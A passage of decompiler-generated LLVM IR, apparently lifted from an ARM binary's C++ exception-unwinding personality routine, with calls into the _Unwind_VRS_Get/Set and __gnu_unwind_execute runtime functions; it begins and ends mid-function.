  %v2_18998111 = inttoptr i32 %v1_18998110 to i32*
  %v3_18998112 = load i32, i32* %v2_18998111, align 4
  store i32 %v3_18998112, i32* @lr, align 4
  %v2_189a4 = add i32 %v1_189a8, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18984
  %v2_18990 = add i32 %v1_189a8, 2
  %v3_18990 = inttoptr i32 %v2_18990 to i16*
  %v4_18990 = load i16, i16* %v3_18990, align 2
  %v5_18990 = zext i16 %v4_18990 to i32
  store i32 %v5_18990, i32* @r5, align 4
  %v0_18998 = load i32, i32* @r8, align 4
  %v1_18998 = add i32 %v0_18998, 72
  %v2_18998 = inttoptr i32 %v1_18998 to i32*
  %v3_18998 = load i32, i32* %v2_18998, align 4
  store i32 %v3_18998, i32* @lr, align 4
  %v2_189a0 = inttoptr i32 %v1_189a8 to i16*
  %v3_189a0 = load i16, i16* %v2_189a0, align 2
  %v4_189a0 = zext i16 %v3_189a0 to i32
  store i32 %v4_189a0, i32* @r6, align 4
  %v2_189a8 = add i32 %v1_189a8, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_189a8, %.thread16 ], [ %v2_189a4, %bb151 ]
  %v3_18998115 = phi i32 [ %v3_18998, %.thread16 ], [ %v3_18998112, %bb151 ]
  %v0_189b0113 = phi i32 [ %v5_18990, %.thread16 ], [ %v4_1898c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_189b0 = and i32 %v0_189b0113, -2
  %v2_189b4 = add i32 %v1_189b0, %v3_18998115
  store i32 %v2_189b4, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_189c4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_189c4, i32* %r0.global-to-local, align 4
  %v5_189d0 = call i32 @_Unwind_VRS_Get(i32 %v0_189c4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_189d0, i32* %r0.global-to-local, align 4
  %v3_189d4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_189d4, i32* %r2.global-to-local, align 4
  %v0_189d8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_189d8, %v3_189d4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_189e4

._crit_edge:                                      ; preds = %bb152
  %v0_189fc.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_189e4:                               ; preds = %bb152
  %v0_189e4 = load i32, i32* @r6, align 4
  %v1_189e4 = and i32 %v0_189e4, -2
  %v2_189e8 = add i32 %v1_189e4, %v0_189d8
  %v3_189ec = icmp ult i32 %v3_189d4, %v2_189e8
  br i1 %v3_189ec, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_189e4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_189e4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_189fc = phi i32 [ %v0_189fc.pre, %._crit_edge ], [ %v0_189e4, %bb153 ], [ %v0_189e4, %.thread20 ]
  %v0_18ba4 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_189f8 = load i32, i32* @r5, align 4
  %v1_189fc = urem i32 %v0_189fc, 2
  %v1_189f8 = mul i32 %v0_189f8, 2
  %v3_18a00 = and i32 %v1_189f8, 2
  %v4_18a00 = or i32 %v3_18a00, %v1_189fc
  store i32 %v4_18a00, i32* %r2.global-to-local, align 4
  %v7_18a04 = icmp eq i32 %v4_18a00, 1
  br i1 %v7_18a04, label %dec_label_pc_18b98, label %dec_label_pc_18a0c

dec_label_pc_18a0c:                               ; preds = %bb154
  %v2_18a04 = icmp eq i32 %v4_18a00, 0
  br i1 %v2_18a04, label %dec_label_pc_18a10, label %dec_label_pc_18ac0

dec_label_pc_18a10:                               ; preds = %dec_label_pc_18a0c
  store i32 %v1_18918, i32* %r2.global-to-local, align 4
  br i1 %v2_18a14, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18a10
  %v0_18a28119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18a28

bb155:                                            ; preds = %dec_label_pc_18a10
  %v2_18a20 = icmp eq i32 %v0_18ba4, 0
  %v0_18a28 = load i32, i32* @r7, align 4
  br i1 %v2_18a20, label %dec_label_pc_18a28, label %dec_label_pc_18da0

dec_label_pc_18a28:                               ; preds = %.thread, %bb155
  %v0_18a28120 = phi i32 [ %v0_18a28119, %.thread ], [ %v0_18a28, %bb155 ]
  %v1_18a28 = add i32 %v0_18a28120, 4
  %v1_18a2c = inttoptr i32 %v1_18a28 to i32*
  %v2_18a2c = load i32, i32* %v1_18a2c, align 4
  %v2_18a30 = icmp eq i32 %v2_18a2c, 0
  br i1 %v2_18a30, label %dec_label_pc_18a38, label %dec_label_pc_18984

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18c4c, %dec_label_pc_18c10, %dec_label_pc_18a28, %dec_label_pc_18978.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18978.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18a28 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18c10 ], [ %stack_var_-76.4, %dec_label_pc_18c4c ]
  %v0_18a38 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18a38, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18a40 = call i32 @__gnu_unwind_execute(i32 %v0_18a38, %anon_struct_13* %tmp156)
  store i32 %v4_18a40, i32* %r0.global-to-local, align 4
  store i32 %v4_18a40, i32* %r5.global-to-local, align 4
  %v2_18a44 = icmp eq i32 %v4_18a40, 0
  br i1 %v2_18a44, label %dec_label_pc_18a4c, label %dec_label_pc_18ac8

dec_label_pc_18a4c:                               ; preds = %dec_label_pc_18a38
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18a50 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18a50, label %bb157, label %dec_label_pc_18a5c

bb157:                                            ; preds = %dec_label_pc_18a4c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18acc

dec_label_pc_18a5c:                               ; preds = %dec_label_pc_18a4c
  %v2_18a5c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18a5c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18a6c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18a6c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18a74 = call i32 @_Unwind_VRS_Get(i32 %v0_18a6c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18a78 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18a6c, i32* %r0.global-to-local, align 4
  %v5_18a8c = call i32 @_Unwind_VRS_Set(i32 %v0_18a6c, i32 %v0_18a78, i32 14, i32 %v0_18a78, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18a8c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v4_18a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 32) to i32*), align 4
  %v0_18a9c = load i32, i32* %r5.global-to-local, align 4
  %v0_18aa0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18aa0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18a98, i32* %stack_var_-48, align 4
  %v5_18ab4 = call i32 @_Unwind_VRS_Set(i32 %v0_18aa0, i32 %v0_18a9c, i32 15, i32 %v0_18a9c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18acc

dec_label_pc_18ac0:                               ; preds = %dec_label_pc_18a0c
  %v7_18ac0 = icmp eq i32 %v4_18a00, 2
  br i1 %v7_18ac0, label %dec_label_pc_18ad8, label %dec_label_pc_18ac8

dec_label_pc_18ac8:                               ; preds = %dec_label_pc_18ac0, %dec_label_pc_18bac, %dec_label_pc_18a38, %dec_label_pc_18da0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18acc

dec_label_pc_18acc:                               ; preds = %bb157, %dec_label_pc_18dd8, %dec_label_pc_18d68, %bb166, %dec_label_pc_18a5c, %dec_label_pc_18ac8
  %v1_18ad4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18dd8 ], [ %v1_18ad4.pre, %dec_label_pc_18d68 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18a5c ], [ 9, %dec_label_pc_18ac8 ]
  store i32 %v3_188e8, i32* %r4.global-to-local, align 4
  store i32 %v6_188e8, i32* %r5.global-to-local, align 4
  ret i32 %v1_18ad4

dec_label_pc_18ad8:                               ; preds = %dec_label_pc_18ac0
  store i32 %v1_18918, i32* %r2.global-to-local, align 4
  %v0_18adc = load i32, i32* @r7, align 4
  %v1_18adc = inttoptr i32 %v0_18adc to i32*
  %v2_18adc = load i32, i32* %v1_18adc, align 4
  %tmp206 = bitcast i32 %v2_18adc to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18ae4 = bitcast float %tmp207 to i32
  store i32 %v1_18ae4, i32* @sl, align 4
  br i1 %v2_18a14, label %dec_label_pc_18aec, label %dec_label_pc_18c58

dec_label_pc_18aec:                               ; preds = %dec_label_pc_18ad8
  %v2_18aec = icmp eq i32 %v0_18ba4, 0
  br i1 %v2_18aec, label %dec_label_pc_18c40, label %dec_label_pc_18af4

dec_label_pc_18af4:                               ; preds = %dec_label_pc_18aec
  %v2_18af8 = icmp eq i32 %v1_18ae4, 0
  br i1 %v2_18af8, label %dec_label_pc_18b04.thread, label %bb159

dec_label_pc_18b04.thread:                        ; preds = %dec_label_pc_18af4
  br label %dec_label_pc_18d68

bb159:                                            ; preds = %dec_label_pc_18af4
  br i1 %v3_18afc, label %dec_label_pc_18b0c, label %dec_label_pc_18c40

dec_label_pc_18b0c:                               ; preds = %bb159
  %v1_18b0c = add i32 %v0_18adc, 4
  store i32 %v1_18b0c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18b1c = load i32, i32* @r8, align 4
  %v1_18b1c = add i32 %v0_18b1c, 88
  store i32 %v1_18b1c, i32* %sb.global-to-local, align 4
  store i32 %v1_18b0c, i32* @r4, align 4
  br label %dec_label_pc_18b40

dec_label_pc_18b30:                               ; preds = %bb161
  %v1_18b30 = add i32 %v0_18b30, 1
  store i32 %v1_18b30, i32* @r5, align 4
  %v1_18b34 = load i32, i32* @sl, align 4
  %v9_18b34 = icmp eq i32 %v1_18b30, %v1_18b34
  %v0_18b38 = load i32, i32* @r4, align 4
  %v1_18b38 = add i32 %v0_18b38, 4
  store i32 %v1_18b38, i32* @r4, align 4
  br i1 %v9_18b34, label %dec_label_pc_18d68, label %dec_label_pc_18b30.dec_label_pc_18b40_crit_edge

dec_label_pc_18b30.dec_label_pc_18b40_crit_edge:  ; preds = %dec_label_pc_18b30
  %v0_18b4c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18b40

dec_label_pc_18b40:                               ; preds = %dec_label_pc_18b30.dec_label_pc_18b40_crit_edge, %dec_label_pc_18b0c
  %v0_18b4c = phi i32 [ %v0_18b4c.pre, %dec_label_pc_18b30.dec_label_pc_18b40_crit_edge ], [ %v1_18b1c, %dec_label_pc_18b0c ]
  %v1_18b50 = phi i32 [ %v1_18b38, %dec_label_pc_18b30.dec_label_pc_18b40_crit_edge ], [ %v1_18b0c, %dec_label_pc_18b0c ]
  %v1_18b40 = inttoptr i32 %v1_18b50 to i32*
  %v2_18b40 = load i32, i32* %v1_18b40, align 4
  %v2_18b44 = icmp eq i32 %v2_18b40, 0
  store i32 %v0_18b4c, i32* %forced_unwind_-44, align 4
  br i1 %v2_18b44, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18b40
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18b40, %bb160
  %v0_18b54 = load i32, i32* @r8, align 4
  store i32 %v0_18b54, i32* %r0.global-to-local, align 4
  store i32 %v2_18be0, i32* %r2.global-to-local, align 4
  %v4_18b64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 100) to i32*), align 4
  store i32 101232, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18b64)
  %v0_18b70 = load i32, i32* %r0.global-to-local, align 4
  %v2_18b70 = icmp eq i32 %v0_18b70, 0
  %v0_18b30 = load i32, i32* @r5, align 4
  br i1 %v2_18b70, label %dec_label_pc_18b30, label %dec_label_pc_18b78

dec_label_pc_18b78:                               ; preds = %bb161
  %v1_18b78 = load i32, i32* @sl, align 4
  %v9_18b78 = icmp eq i32 %v0_18b30, %v1_18b78
  br i1 %v9_18b78, label %dec_label_pc_18d68, label %dec_label_pc_18b80

dec_label_pc_18b80:                               ; preds = %dec_label_pc_18b78
  %v0_18b80 = load i32, i32* @r7, align 4
  %v1_18b80 = inttoptr i32 %v0_18b80 to i32*
  %v2_18b80 = load i32, i32* %v1_18b80, align 4
  %v1_18b84 = icmp slt i32 %v2_18b80, 0
  %v0_18b8c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18b84, label %dec_label_pc_18b8c, label %dec_label_pc_18c4c

dec_label_pc_18b8c:                               ; preds = %dec_label_pc_18b80, %dec_label_pc_18c44
  %v0_18b8c = phi i32 [ %storemerge, %dec_label_pc_18c44 ], [ %v0_18b8c.pre, %dec_label_pc_18b80 ]
  store i32 %v0_18b8c, i32* %r0.global-to-local, align 4
  %v1_18b90 = add i32 %v0_18b8c, 4
  store i32 %v1_18b90, i32* @r6, align 4
  br label %dec_label_pc_18c4c

dec_label_pc_18b98:                               ; preds = %bb154
  store i32 %v1_18918, i32* %r2.global-to-local, align 4
  br i1 %v2_18a14, label %dec_label_pc_18ba4, label %dec_label_pc_18c90

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b98
  %v2_18ba4 = icmp eq i32 %v0_18ba4, 0
  br i1 %v2_18ba4, label %dec_label_pc_18c10, label %dec_label_pc_18bac

dec_label_pc_18bac:                               ; preds = %dec_label_pc_18ba4
  %v0_18bac = load i32, i32* @r7, align 4
  %v1_18bac = add i32 %v0_18bac, 4
  %v2_18bac = inttoptr i32 %v1_18bac to i32*
  %v3_18bac = load i32, i32* %v2_18bac, align 4
  %v7_18bb0 = icmp eq i32 %v3_18bac, -2
  store i32 %v1_18bac, i32* %r2.global-to-local, align 4
  br i1 %v7_18bb0, label %dec_label_pc_18ac8, label %dec_label_pc_18bbc

dec_label_pc_18bbc:                               ; preds = %dec_label_pc_18bac
  %v0_18bbc = load i32, i32* @r8, align 4
  %v1_18bbc = add i32 %v0_18bbc, 88
  %v7_18bc0 = icmp eq i32 %v3_18bac, -1
  store i32 %v1_18bbc, i32* %forced_unwind_-44, align 4
  br i1 %v7_18bc0, label %dec_label_pc_18c04, label %dec_label_pc_18bcc

dec_label_pc_18bcc:                               ; preds = %dec_label_pc_18bbc
  %v2_18bd0 = icmp eq i32 %v3_18bac, 0
  br i1 %v2_18bd0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18bcc
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18bcc, %bb162
  store i32 %v0_18bbc, i32* %r0.global-to-local, align 4
  store i32 %v2_18be0, i32* %r2.global-to-local, align 4
  %v4_18bec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 100) to i32*), align 4
  store i32 101368, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18bec)
  %v0_18bf8 = load i32, i32* %r0.global-to-local, align 4
  %v2_18bf8 = icmp eq i32 %v0_18bf8, 0
  br i1 %v2_18bf8, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18c04.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18c04

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18c10

dec_label_pc_18c04:                               ; preds = %.thread25, %dec_label_pc_18bbc
  %v3_18c04 = phi i32 [ %v3_18c04.pr, %.thread25 ], [ %v1_18bbc, %dec_label_pc_18bbc ]
  %v2_18c08 = icmp eq i32 %v3_18c04, 0
  br i1 %v2_18c08, label %dec_label_pc_18c10, label %dec_label_pc_18d68

dec_label_pc_18c10:                               ; preds = %bb164, %dec_label_pc_18cbc, %dec_label_pc_18c90, %dec_label_pc_18c04, %dec_label_pc_18ba4
  %v0_18c10 = load i32, i32* @r7, align 4
  %v1_18c10 = add i32 %v0_18c10, 8
  %v1_18978 = inttoptr i32 %v1_18c10 to i32*
  %v2_18978 = load i32, i32* %v1_18978, align 4
  %v2_1897c = icmp eq i32 %v2_18978, 0
  br i1 %v2_1897c, label %dec_label_pc_18a38, label %dec_label_pc_18984.preheader

dec_label_pc_18c18:                               ; preds = %entry
  %v3_18c18 = udiv i32 %v2_1890c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18c28 = mul nuw nsw i32 %v3_18c18, 4
  %v3_18c2c = mul i32 %v2_1890c, 65536
  %v2_18c30 = add i32 %v6_18c28, %v4_1890c
  store i32 %v3_18c2c, i32* %v4_1892c, align 8
  br label %dec_label_pc_18954

dec_label_pc_18c40:                               ; preds = %bb159, %dec_label_pc_18aec
  %v1_18c40 = add i32 %v0_18adc, 4
  br label %dec_label_pc_18c44

dec_label_pc_18c44:                               ; preds = %dec_label_pc_18c84, %dec_label_pc_18c40
  %v0_18c44 = phi i32 [ %v2_18c84, %dec_label_pc_18c84 ], [ %v2_18adc, %dec_label_pc_18c40 ]
  %storemerge = phi i32 [ %v4_18c84, %dec_label_pc_18c84 ], [ %v1_18c40, %dec_label_pc_18c40 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18c44 = icmp slt i32 %v0_18c44, 0
  br i1 %v1_18c44, label %dec_label_pc_18b8c, label %dec_label_pc_18c4c

dec_label_pc_18c4c:                               ; preds = %dec_label_pc_18b80, %dec_label_pc_18c44, %dec_label_pc_18d58, %dec_label_pc_18b8c
  %v0_18c50 = phi i32 [ %v1_18b90, %dec_label_pc_18b8c ], [ %storemerge, %dec_label_pc_18c44 ], [ %v1_18d5c, %dec_label_pc_18d58 ], [ %v0_18b8c.pre, %dec_label_pc_18b80 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18b8c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18c44 ], [ %v1_18d58, %dec_label_pc_18d58 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18b80 ]
  %v0_18c4c = load i32, i32* @sl, align 4
  %v3_18c4c = mul i32 %v0_18c4c, 4
  %v2_18c50 = add i32 %v3_18c4c, %v0_18c50
  %v1_1897865 = inttoptr i32 %v2_18c50 to i32*
  %v2_1897866 = load i32, i32* %v1_1897865, align 4
  %v2_1897c68 = icmp eq i32 %v2_1897866, 0
  br i1 %v2_1897c68, label %dec_label_pc_18a38, label %dec_label_pc_18984.preheader.lr.ph

dec_label_pc_18c58:                               ; preds = %dec_label_pc_18ad8
  %v0_18c68 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18c68, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18c70 = load i32, i32* @r8, align 4
  %v1_18c70 = add i32 %v0_18c70, 32
  %v2_18c70 = inttoptr i32 %v1_18c70 to i32*
  %v3_18c70 = load i32, i32* %v2_18c70, align 4
  store i32 %v3_18c70, i32* @r4, align 4
  %v5_18c74 = call i32 @_Unwind_VRS_Get(i32 %v0_18c68, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18c74, i32* %r0.global-to-local, align 4
  %v3_18c78 = load i32, i32* %stack_var_-48, align 4
  %v0_18c7c = load i32, i32* @r4, align 4
  %v9_18c7c = icmp eq i32 %v0_18c7c, %v3_18c78
  br i1 %v9_18c7c, label %dec_label_pc_18d24, label %dec_label_pc_18c58.dec_label_pc_18c84_crit_edge

dec_label_pc_18c58.dec_label_pc_18c84_crit_edge:  ; preds = %dec_label_pc_18c58
  %v0_18c84.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18c84

dec_label_pc_18c84:                               ; preds = %dec_label_pc_18c58.dec_label_pc_18c84_crit_edge, %dec_label_pc_18d24
  %v0_18c84 = phi i32 [ %v0_18c84.pre, %dec_label_pc_18c58.dec_label_pc_18c84_crit_edge ], [ %v1_18d28, %dec_label_pc_18d24 ]
  %v1_18c84 = inttoptr i32 %v0_18c84 to i32*
  %v2_18c84 = load i32, i32* %v1_18c84, align 4
  %v4_18c84 = add i32 %v0_18c84, 4
  store i32 %v4_18c84, i32* @r7, align 4
  br label %dec_label_pc_18c44

dec_label_pc_18c90:                               ; preds = %dec_label_pc_18b98
  %v0_18ca0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18ca0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18ca8 = load i32, i32* @r8, align 4
  %v1_18ca8 = add i32 %v0_18ca8, 32
  %v2_18ca8 = inttoptr i32 %v1_18ca8 to i32*
  %v3_18ca8 = load i32, i32* %v2_18ca8, align 4
  store i32 %v3_18ca8, i32* @r4, align 4
  %v5_18cac = call i32 @_Unwind_VRS_Get(i32 %v0_18ca0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18cac, i32* %r0.global-to-local, align 4
  %v3_18cb0 = load i32, i32* %stack_var_-48, align 4
  %v0_18cb4 = load i32, i32* @r4, align 4
  %v9_18cb4 = icmp eq i32 %v0_18cb4, %v3_18cb0
  br i1 %v9_18cb4, label %dec_label_pc_18cbc, label %dec_label_pc_18c10

dec_label_pc_18cbc:                               ; preds = %dec_label_pc_18c90
  %v0_18cbc = load i32, i32* @r8, align 4
  %v1_18cbc = add i32 %v0_18cbc, 40
  %v2_18cbc = inttoptr i32 %v1_18cbc to i32*
  %v3_18cbc = load i32, i32* %v2_18cbc, align 4
  %v1_18cc0 = load i32, i32* @r7, align 4
  %v9_18cc0 = icmp eq i32 %v3_18cbc, %v1_18cc0
  br i1 %v9_18cc0, label %dec_label_pc_18cc8, label %dec_label_pc_18c10

dec_label_pc_18cc8:                               ; preds = %dec_label_pc_18cbc
  %v1_18cc8 = inttoptr i32 %v3_18cbc to i32*
  %v2_18cc8 = load i32, i32* %v1_18cc8, align 4
  %v1_18ccc = and i32 %v2_18cc8, 1073741824
  %v2_18ccc = icmp eq i32 %v1_18ccc, 0
  br i1 %v2_18ccc, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18cc8
  %v2_18cd0 = or i32 %v2_18cc8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18cc8
  %tmp208 = bitcast i32 %v2_18cc8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18cd4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18cd8 = phi i32 [ %v2_18e08, %.thread28 ], [ %v2_18e08, %bb169 ], [ %v3_18cbc, %bb165 ], [ %v3_18cbc, %.thread26 ]
  %v0_18cd8 = phi i32 [ %v2_18e18, %.thread28 ], [ %v2_18e14, %bb169 ], [ %v2_18cd0, %bb165 ], [ %v2_18cd4, %.thread26 ]
  %v2_18cd8 = add i32 %v0_18cd8, %v1_18cd8
  store i32 %v2_18cd8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18cf0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18cf0, i32* %r0.global-to-local, align 4
  %v5_18cf8 = call i32 @_Unwind_VRS_Set(i32 %v0_18cf0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18cf0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18d10 = load i32, i32* @r8, align 4
  store i32 %v0_18d10, i32* %stack_var_-48, align 4
  %v5_18d18 = call i32 @_Unwind_VRS_Set(i32 %v0_18cf0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18acc

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18c58
  %v0_18d24 = load i32, i32* @r8, align 4
  %v1_18d24 = add i32 %v0_18d24, 40
  %v2_18d24 = inttoptr i32 %v1_18d24 to i32*
  %v3_18d24 = load i32, i32* %v2_18d24, align 4
  %v1_18d28 = load i32, i32* @r7, align 4
  %v9_18d28 = icmp eq i32 %v3_18d24, %v1_18d28
  br i1 %v9_18d28, label %dec_label_pc_18d30, label %dec_label_pc_18c84

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18d24
  %v1_18d34 = add i32 %v3_18d24, 4
  store i32 %v1_18d34, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_18d3c = add i32 %v0_18d24, 44
  %v3_18d3c = inttoptr i32 %v2_18d3c to i32*
  store i32 0, i32* %v3_18d3c, align 4
  %v0_18d40 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d40 = load i32, i32* @r8, align 4
  %v2_18d40 = add i32 %v1_18d40, 48
  %v3_18d40 = inttoptr i32 %v2_18d40 to i32*
  store i32 %v0_18d40, i32* %v3_18d40, align 4
  %v0_18d44 = load i32, i32* @sl, align 4
  %v1_18d44 = load i32, i32* @r8, align 4
  %v2_18d44 = add i32 %v1_18d44, 40
  %v3_18d44 = inttoptr i32 %v2_18d44 to i32*
  store i32 %v0_18d44, i32* %v3_18d44, align 4
  %v0_18d48 = load i32, i32* %r0.global-to-local, align 4
  %v1_18d48 = load i32, i32* @r8, align 4
  %v2_18d48 = add i32 %v1_18d48, 52
  %v3_18d48 = inttoptr i32 %v2_18d48 to i32*
  store i32 %v0_18d48, i32* %v3_18d48, align 4
  %v0_18d4c = load i32, i32* @r7, align 4
  %v1_18d4c = inttoptr i32 %v0_18d4c to i32*
  %v2_18d4c = load i32, i32* %v1_18d4c, align 4
  %v1_18d50 = icmp slt i32 %v2_18d4c, 0
  br i1 %v1_18d50, label %dec_label_pc_18d58, label %dec_label_pc_18e04

dec_label_pc_18d58:                               ; preds = %dec_label_pc_18d30
  %v0_18d58 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d58 = add i32 %v0_18d58, -3
  store i32 %v1_18d58, i32* %r2.global-to-local, align 4
  %v0_18d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_18d5c = add i32 %v0_18d5c, 4
  store i32 %v1_18d5c, i32* @r6, align 4
  br label %dec_label_pc_18c4c

dec_label_pc_18d68:                               ; preds = %dec_label_pc_18b78, %dec_label_pc_18c04, %dec_label_pc_18b30, %dec_label_pc_18b04.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18d78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d78, i32* %r0.global-to-local, align 4
  %v5_18d80 = call i32 @_Unwind_VRS_Get(i32 %v0_18d78, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18d84 = load i32, i32* @r7, align 4
  %v1_18d84 = load i32, i32* @r8, align 4
  %v2_18d84 = add i32 %v1_18d84, 40
  %v3_18d84 = inttoptr i32 %v2_18d84 to i32*
  store i32 %v0_18d84, i32* %v3_18d84, align 4
  %v3_18d88 = load i32, i32* %stack_var_-48, align 4
  %v3_18d8c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_18d8c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18d94 = load i32, i32* @r8, align 4
  %v2_18d94 = add i32 %v1_18d94, 32
  %v3_18d94 = inttoptr i32 %v2_18d94 to i32*
  store i32 %v3_18d88, i32* %v3_18d94, align 4
  %v0_18d98 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d98 = load i32, i32* @r8, align 4
  %v2_18d98 = add i32 %v1_18d98, 36
  %v3_18d98 = inttoptr i32 %v2_18d98 to i32*
  store i32 %v0_18d98, i32* %v3_18d98, align 4
  %v1_18ad4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18acc

dec_label_pc_18da0:                               ; preds = %bb155
  %v1_18da0 = inttoptr i32 %v0_18a28 to i32*
  %v2_18da0 = load i32, i32* %v1_18da0, align 4
  %v1_18da4 = add i32 %v0_18a28, 4
  %v1_18da8 = and i32 %v2_18da0, 1073741824
  %v2_18da8 = icmp eq i32 %v1_18da8, 0
  %v2_18dac = or i32 %v2_18da0, -2147483648
  %tmp210 = bitcast i32 %v2_18da0 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18db0 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18da8, i32 %v2_18db0, i32 %v2_18dac
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18db4 = load i32, i32* @r8, align 4
  %v2_18db4 = add i32 %v1_18db4, 56
  %v3_18db4 = inttoptr i32 %v2_18db4 to i32*
  store i32 %v1_18da4, i32* %v3_18db4, align 4
  %v0_18db8 = load i32, i32* @r8, align 4
  store i32 %v0_18db8, i32* %r0.global-to-local, align 4
